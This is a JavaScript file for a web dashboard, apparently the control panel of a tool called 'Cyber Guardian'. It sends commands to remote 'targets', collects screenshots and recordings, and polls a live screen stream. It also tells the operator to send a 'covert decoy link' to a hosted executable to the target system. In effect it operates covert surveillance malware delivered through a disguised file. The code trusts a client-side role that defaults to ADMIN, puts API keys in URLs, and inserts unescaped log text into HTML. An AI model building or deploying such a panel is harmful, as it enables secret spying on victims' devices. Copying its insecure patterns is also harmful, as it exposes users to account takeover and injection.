const API_BASE = 'https://cyber-guardian-platform.onrender.com';

// Read from localStorage
const apiKey = localStorage.getItem('apiKey');
const role = localStorage.getItem('role') || 'ADMIN';
let currentTarget = 'ALL';

if (!apiKey) {
    window.location.href = 'login.html';
}

function logoutUser() {
    localStorage.removeItem('apiKey');
    localStorage.removeItem('role');
    window.location.href = 'login.html';
}

function changeTarget(targetId) {
    currentTarget = targetId;
    loadDashboardData();
}

function switchTab(tabId, clickedElement) {
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.getElementById(tabId)?.classList.add('active-tab');
    if (clickedElement) {
        clickedElement.classList.add('active');
    } else {
        document.querySelectorAll('.nav-item').forEach(item => {
            if (item.getAttribute('onclick')?.includes(tabId)) item.classList.add('active');
        });
    }
}

function sendCommand(action) {
    fetch(`${API_BASE}/api/control?action=${action}&apiKey=${apiKey}&role=${role}&targetId=${currentTarget}`, { method: 'POST' })
        .then(r => r.text())
        .then(data => {
            if(data.includes("ERROR")) alert('Unauthorized action: Only Admins can override commands!');
            else alert('System command pushed: ' + action);
        })
        .catch(e => alert('Failed pushing control request: ' + e));
}

function toggleKavach() {
    const shieldBtn = document.getElementById('hubKavachBtn');
    let isActivating = shieldBtn.innerText.includes('Enable');
    fetch(`${API_BASE}/api/kavach/toggle?active=${isActivating}&role=${role}&apiKey=${apiKey}`, { method: 'POST' })
        .then(r => r.text())
        .then(data => {
            if(data.includes("UNAUTHORIZED")) alert("Unauthorized Action: Only Root Admins can toggle security shield!");
            else verifyShieldState();
        });
}

function verifyShieldState() {
    fetch(`${API_BASE}/api/status`)
        .then(r => r.json())
        .then(data => {
            const hubBtn = document.getElementById('hubKavachBtn');
            const labelBadge = document.getElementById('shieldLabel');
            const heartbeatNode = document.getElementById('heartbeatNode');
            const kavachPulseText = document.getElementById('kavachPulseText');

            if (data.kavachActive) {
                if(hubBtn) { hubBtn.innerText = '🛡️ Disable AI Kavach Shield'; hubBtn.style.background = 'rgba(239, 68, 68, 0.1)'; hubBtn.style.borderColor = 'rgba(239, 68, 68, 0.3)'; hubBtn.style.color = 'var(--danger)'; }
                if(labelBadge) { labelBadge.innerText = 'Shield Active'; labelBadge.className = 'status-pill status-secure'; }
                if(heartbeatNode) { heartbeatNode.style.borderColor = 'var(--success)'; heartbeatNode.style.boxShadow = '0 0 20px rgba(16, 185, 129, 0.3)'; }
                if(kavachPulseText) kavachPulseText.innerText = 'Security Shield Engaged';
            } else {
                if(hubBtn) { hubBtn.innerText = '🛡️ Enable AI Kavach Shield'; hubBtn.style.background = 'rgba(16, 185, 129, 0.1)'; hubBtn.style.borderColor = 'rgba(16, 185, 129, 0.3)'; hubBtn.style.color = 'var(--success)'; }
                if(labelBadge) { labelBadge.innerText = 'Shield Disabled'; labelBadge.className = 'status-pill status-alert'; }
                if(heartbeatNode) { heartbeatNode.style.borderColor = '#f59e0b'; heartbeatNode.style.boxShadow = '0 0 20px rgba(245, 158, 11, 0.3)'; }
                if(kavachPulseText) kavachPulseText.innerText = 'Shield Offline';
            }
        });
}

let loggedLines = 0;
function pollTelemetryLogs() {
    fetch(`${API_BASE}/api/logs`)
        .then(r => r.json())
        .then(logs => {
            const hubFeed = document.getElementById('liveFeedHub');
            if (logs.length > loggedLines) {
                for (let i = loggedLines; i < logs.length; i++) {
                    const log = logs[i];
                    const row = document.createElement('div');
                    row.style.marginBottom = '6px';
                    row.innerHTML = `<span style="color:#64748b;">[${new Date(log.timestamp).toLocaleTimeString()}]</span> <span style="color:var(--primary); font-weight:700;">${log.action}:</span> ${log.details}`;
                    if (log.details.toLowerCase().includes("kockroach") || log.details.toLowerCase().includes("spy")) {
                        row.style.color = 'var(--danger)';
                        document.getElementById('kavachAlertBanner').style.display = 'block';
                    }
                    if(hubFeed) hubFeed.appendChild(row);
                }
                if(hubFeed) hubFeed.scrollTop = hubFeed.scrollHeight;
                loggedLines = logs.length;
            }
        });
}

function loadDashboardData() {
    fetch(`${API_BASE}/api/dashboard-data?apiKey=${apiKey}&targetId=${currentTarget}&role=${role}`)
        .then(r => r.json())
        .then(data => {
            if (!data.success) {
                logoutUser();
                return;
            }

            document.getElementById('navApiKey').innerText = data.user.apiKey;
            document.getElementById('navUserEmail').innerText = data.user.email;
            
            const roleContainer = document.getElementById('roleBadgeContainer');
            if(data.role === 'ADMIN') {
                roleContainer.innerHTML = '<div class="role-badge badge-admin">👑 Root Admin</div>';
            } else {
                roleContainer.innerHTML = '<div class="role-badge badge-police">🛡️ Forensic Officer</div>';
            }

            // Stats
            document.getElementById('statTotalBreaches').innerText = data.totalBreaches;
            document.getElementById('statActiveUsers').innerText = data.activeUsers;
            document.getElementById('statCriticalAlerts').innerText = data.criticalAlerts;
            document.getElementById('statTotalBreaches2').innerText = data.totalBreaches;
            document.getElementById('statActiveUsers2').innerText = data.activeUsers;
            document.getElementById('statCriticalAlerts2').innerText = data.criticalAlerts;

            // Target Dropdown
            const targetSelect = document.getElementById('targetSelector');
            let opts = `<option value="ALL" ${data.currentTarget==='ALL'?'selected':''}>🔍 ALL TARGETS</option>`;
            data.targets.forEach(t => {
                opts += `<option value="${t}" ${data.currentTarget===t?'selected':''}>${t}</option>`;
            });
            targetSelect.innerHTML = opts;

            // Evidence Grids
            const grid1 = document.getElementById('evidenceGrid1');
            const galleryGrid = document.getElementById('galleryGrid');
            let mediaHtml = '';
            if (data.screenshots.length === 0) {
                mediaHtml = '<div style="grid-column: span 3; text-align: center; padding: 60px; color: var(--text-dim);">No screen evidence records captured. Perform "Screenshot" or "Record" controls to capture evidence.</div>';
            } else {
                data.screenshots.forEach(file => {
                    const src = `${API_BASE}/api/screenshots/${file}?targetId=${data.currentTarget}`;
                    const isVid = file.endsWith('.mp4');
                    if (isVid) {
                        mediaHtml += `
                        <div class="evidence-item gallery-media-card" data-type="video" data-name="${file}" style="background: rgba(13, 17, 28, 0.4); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; position: relative; transition: all 0.3s ease; aspect-ratio: 16/10;">
                            <div style="width: 100%; height: 100%; position: relative; overflow: hidden;">
                                <div style="width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #06070a; cursor: pointer;" onclick="openMediaModal('${src}', 'video', '${file}')">
                                    <span style="font-size: 48px; color: var(--primary); filter: drop-shadow(0 0 10px var(--primary));">▶️</span>
                                </div>
                                <span class="role-badge" style="position: absolute; top: 12px; left: 12px; font-size: 9px; padding: 4px 8px; border-color: rgba(157,78,221,0.3); color: #c084fc; background: rgba(157,78,221,0.1);">🎥 VIDEO</span>
                            </div>
                            <div class="time-tag" style="background: rgba(6, 7, 10, 0.85); backdrop-filter: blur(10px); padding: 10px 14px; font-size: 11px; border-top: 1px solid var(--border); font-family: monospace; display: flex; justify-content: space-between; align-items: center;">
                                <span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 180px;">${file}</span>
                                <span style="color: var(--primary); cursor: pointer;" onclick="openMediaModal('${src}', 'video', '${file}')">👁️ Preview</span>
                            </div>
                        </div>`;
                    } else {
                        mediaHtml += `
                        <div class="evidence-item gallery-media-card" data-type="image" data-name="${file}" style="background: rgba(13, 17, 28, 0.4); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; position: relative; transition: all 0.3s ease; aspect-ratio: 16/10;">
                            <div style="width: 100%; height: 100%; position: relative; overflow: hidden;">
                                <img src="${src}" alt="Forensic Asset Capture" style="width: 100%; height: 100%; object-fit: cover; cursor: pointer; transition: transform 0.4s ease;" onclick="openMediaModal('${src}', 'image', '${file}')">
                                <span class="role-badge" style="position: absolute; top: 12px; left: 12px; font-size: 9px; padding: 4px 8px; border-color: rgba(0, 242, 254, 0.3); color: var(--primary); background: rgba(0, 242, 254, 0.1);">📸 IMAGE</span>
                            </div>
                            <div class="time-tag" style="background: rgba(6, 7, 10, 0.85); backdrop-filter: blur(10px); padding: 10px 14px; font-size: 11px; border-top: 1px solid var(--border); font-family: monospace; display: flex; justify-content: space-between; align-items: center;">
                                <span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 180px;">${file}</span>
                                <span style="color: var(--primary); cursor: pointer;" onclick="openMediaModal('${src}', 'image', '${file}')">👁️ Preview</span>
                            </div>
                        </div>`;
                    }
                });
            }
            if(grid1) grid1.innerHTML = mediaHtml;
            if(galleryGrid) galleryGrid.innerHTML = mediaHtml;

            // Users table
            const usersTbody = document.getElementById('usersTableBody');
            let uHtml = '';
            data.users.forEach(u => {
                const isOnline = u.lastSeen && (new Date() - new Date(u.lastSeen))/60000 < 2;
                uHtml += `
                <tr>
                    <td style="font-family:'JetBrains Mono', monospace; font-weight:700; color:var(--primary);">${u.apiKey}</td>
                    <td>${u.email}</td>
                    <td>${u.lastSeen ? new Date(u.lastSeen).toLocaleTimeString() : 'Never Active'}</td>
                    <td><span class="status-pill ${isOnline?'status-secure':'status-breach'}">${isOnline?'ONLINE':'OFFLINE'}</span></td>
                </tr>`;
            });
            if(usersTbody) usersTbody.innerHTML = uHtml;

            // Logs table
            const logsTbody = document.getElementById('logsTableBody');
            let lHtml = '';
            if (data.logs.length === 0) {
                lHtml = '<tr><td colspan="6" style="text-align: center; padding: 40px; color: var(--text-dim);">No alerts logged by the AI protection shield.</td></tr>';
            } else {
                data.logs.forEach(log => {
                    const isCrit = log.appName === 'KOCKROACH';
                    let proof = '<span style="color:var(--text-dim); font-size: 12px;">No proof</span>';
                    if (log.screenshotPath) {
                        const lSrc = `${API_BASE}/api/screenshots/${log.screenshotPath}?targetId=${data.currentTarget}`;
                        if (log.screenshotPath.endsWith('.mp4')) {
                            proof = `<video width="120" controls style="border-radius: 6px; border: 1px solid var(--border-glow);"><source src="${lSrc}" type="video/mp4"></video>`;
                        } else {
                            proof = `<a href="${lSrc}" target="_blank"><img src="${lSrc}" style="width: 80px; border-radius: 6px; border: 1px solid var(--border-glow); cursor:pointer;"></a>`;
                        }
                    }
                    lHtml += `
                    <tr>
                        <td style="font-family:'JetBrains Mono', monospace; font-size:12px;">${new Date(log.timestamp).toLocaleString()}</td>
                        <td style="font-weight:600;">${log.details}</td>
                        <td style="color:var(--primary); font-weight:700;">${log.appName}</td>
                        <td>${log.action}</td>
                        <td><span class="status-pill ${isCrit?'status-breach':'status-secure'}">${isCrit?'CRITICAL':'MITIGATED'}</span></td>
                        <td>${proof}</td>
                    </tr>`;
                });
            }
            if(logsTbody) logsTbody.innerHTML = lHtml;

            // Telegram form init
            const telForm = document.getElementById('telegramForm');
            if(telForm) {
                document.getElementById('telBotToken').value = data.user.telegramBotToken || '';
                document.getElementById('telChatId').value = data.user.telegramChatId || '';
                telForm.onsubmit = (e) => {
                    e.preventDefault();
                    fetch(`${API_BASE}/api/save-telegram?apiKey=${apiKey}&botToken=${document.getElementById('telBotToken').value}&chatId=${document.getElementById('telChatId').value}&role=${role}`, {method: 'POST'})
                        .then(r=>r.json()).then(res => alert(res.message));
                };
            }
            
            // Decoy Link
            document.getElementById('decoyField').value = `${API_BASE}/3rd-AI-Agent.exe`;
        });
}

function copyDecoyLink() {
    var copyText = document.getElementById("decoyField");
    copyText.select();
    document.execCommand("copy");
    alert("Covert decoy link copied! Dispatch it to target system.");
}

// Media Lightbox
function openMediaModal(src, type, name) {
    const modal = document.getElementById('mediaLightbox');
    const img = document.getElementById('modalImg');
    const video = document.getElementById('modalVideo');
    document.getElementById('modalFileName').innerText = name;
    modal.style.display = 'flex';
    if (type === 'image') {
        img.src = src; img.style.display = 'block';
        video.style.display = 'none'; video.pause(); video.src = '';
    } else {
        video.src = src; video.style.display = 'block';
        img.style.display = 'none'; img.src = '';
        video.load(); video.play();
    }
}

function closeMediaModal() {
    const modal = document.getElementById('mediaLightbox');
    const img = document.getElementById('modalImg');
    const video = document.getElementById('modalVideo');
    modal.style.display = 'none';
    img.src = ''; video.pause(); video.src = '';
}

// Register Form
const regForm = document.getElementById('unifiedRegisterForm');
if (regForm) {
    regForm.addEventListener('submit', (e) => {
        e.preventDefault();
        const email = document.getElementById('regEmail').value;
        const password = document.getElementById('regPassword').value;
        const botToken = document.getElementById('regBotToken').value;
        const chatId = document.getElementById('regChatId').value;
        const formData = new FormData();
        formData.append('email', email);
        formData.append('password', password);
        if (botToken) formData.append('botToken', botToken);
        if (chatId) formData.append('chatId', chatId);
        fetch(`${API_BASE}/api/register`, { method: 'POST', body: formData })
        .then(r => r.json())
        .then(data => {
            if (data.success) {
                alert('Account created successfully!');
                regForm.reset();
            } else {
                alert('Error: ' + data.message);
            }
        });
    });
}

// Live gallery filters
function filterGallery(type) {
    document.querySelectorAll('.active-filter').forEach(e=>e.classList.remove('active-filter'));
    if(type==='ALL') document.getElementById('filterAllBtn').classList.add('active-filter');
    if(type==='IMAGES') document.getElementById('filterImagesBtn').classList.add('active-filter');
    if(type==='VIDEOS') document.getElementById('filterVideosBtn').classList.add('active-filter');
    
    document.querySelectorAll('.gallery-media-card').forEach(c => {
        const cardType = c.getAttribute('data-type');
        if (type === 'ALL' || (type === 'IMAGES' && cardType === 'image') || (type === 'VIDEOS' && cardType === 'video')) c.style.display = 'block';
        else c.style.display = 'none';
    });
}

function searchGallery() {
    const query = document.getElementById('gallerySearchInput').value.toLowerCase();
    document.querySelectorAll('.gallery-media-card').forEach(c => {
        const name = c.getAttribute('data-name').toLowerCase();
        c.style.display = name.includes(query) ? 'block' : 'none';
    });
}

// Init
loadDashboardData();
verifyShieldState();
pollTelemetryLogs();

setInterval(loadDashboardData, 10000); // Reload stats every 10s
setInterval(verifyShieldState, 8000);
setInterval(pollTelemetryLogs, 3000);

setInterval(() => {
    const screenFrame = document.getElementById('liveMonitorSrc');
    if (screenFrame) {
        screenFrame.src = `${API_BASE}/api/live-stream?targetId=${currentTarget}&time=` + new Date().getTime();
    }
}, 1500);
